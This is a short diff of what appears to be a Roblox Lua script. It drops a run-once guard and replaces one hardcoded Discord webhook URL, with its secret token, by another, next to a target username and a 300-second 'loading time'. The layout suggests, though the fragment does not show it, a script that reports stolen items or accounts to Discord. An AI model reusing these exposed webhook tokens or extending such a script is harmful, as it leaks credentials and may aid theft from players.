@@ -1,7 +1,4 @@
-if _G.ExecutedArmorSetup then return end
-_G.ExecutedArmorSetup = true
-
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1383602706580635699/0FDVqbaXSB5vHxozqz1cdJBuXAkQqEl9FrwzTCLLIGaq1iYExNs4ITcltwx_0EJ60aAr"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1383655059719721041/2aDPVMFIIwr4woa0TbDz4fXn6wk_jz_0fh1Le4bv3Y4_gg449XEPJMNAqxSy6jqhJgPJ"
 local TARGET_NAME = "Davenaseventeen"
 local LOADING_TIME = 300
 
